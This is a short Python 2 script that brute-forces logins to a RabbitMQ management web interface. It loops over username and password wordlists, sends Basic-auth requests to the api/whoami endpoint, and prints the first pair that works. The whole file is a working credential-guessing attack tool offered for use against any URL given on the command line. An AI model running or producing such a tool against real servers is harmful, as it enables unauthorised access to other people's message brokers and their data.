#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
# author：wkong、
# Crack RabbitMQ Management Web User
# 2019 09-27
# Cool in one hundred lines of code
# UseAge:
# 	python rabbitmq_crack.py http://www.example.com:15672/
import hackhttp
import json
import sys
import getopt
import base64
import urllib
from urlparse import *

def reData(hh,url,user,pwd):
	headers_dict = {
		'Host':'',
		'Cookie':'',
		'authorization':'',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
		'Referer':''
	}

	auth_str = user+':'+pwd

	url_info = urlparse(url)

	headers_dict['Host'] = url_info[1]
	headers_dict['Referer'] = url
	headers_dict['authorization'] = 'Basic '+base64.b64encode(auth_str)
	headers_dict['Cookie'] = 'm=2258:'+urllib.quote(urllib.quote(headers_dict['authorization'][6:]))

	try:
		code, head, body, reurl, log = hh.http(url+'api/whoami',headers=headers_dict)
		data = json.loads(body)
		
		if code==200 and user in data['name']:
			return True
		else:
			return False
	except:
		print '[Error]'+user+':'+pwd
		return False

def Crack(target):
	with open(passFile,'r') as passFiles:
		passlines = passFiles.readlines()

	with open(userFile,'r') as userFiles:
		userlines = userFiles.readlines()
	
	for passwd in passlines:
		for user in userlines:
			if reData(hh,target,user.strip(),passwd.strip()):
				print('[Success]'+user.strip()+':'+passwd.strip())
				exit()


def help():
	print'''Help:
\tuseage: python rabbitmq_crack.py http://www.example:15672/'''
	exit()

def loadParement():
    return True


if __name__ == '__main__':
	global userFile
	global passFile
	global hh

	target = sys.argv[1]

	userFile = 'user.txt'
	passFile = 'pass.txt'

	hh = hackhttp.hackhttp()

	Crack(target)
